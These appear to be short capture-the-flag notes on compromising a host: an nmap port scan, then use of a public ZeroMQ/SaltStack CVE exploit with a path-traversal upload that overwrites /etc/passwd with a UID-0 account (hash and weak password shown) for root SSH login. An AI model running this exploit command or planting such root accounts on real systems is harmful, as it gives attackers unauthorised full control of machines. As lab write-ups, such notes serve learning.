
```
22/tcp open ssh OpenSSH 7.4 (protocol 2.0)
53/tcp open domain NLnet Labs NSD
80/tcp open http nginx 1.16.1
|_http-title: Home | Mezzanine
4505/tcp open zmtp ZeroMQ ZMTP 2.0
4506/tcp open zmtp ZeroMQ ZMTP 2.0
8000/tcp open http nginx 1.16.1
|_http-title: Site doesn't have a title (application/json).
```

- couldn't find anything from the web servers 
- found a CVE exploit from git hub for the service ZeroMQ 
- Attempted to get a reverse shell, couldn't get it So I uploaded a users to /etc/passwd 
```
pwend:$1$r/5WEL9l$gr6/QAygoP4zISL2SSrfr1:0:0:root:/root:/bin/bash
```
password = 123

```
python3 exploit.py --master TARGET --upload-src passwd --upload-dest ../../../../../../etc/passwd
```

SSH login for root shell!

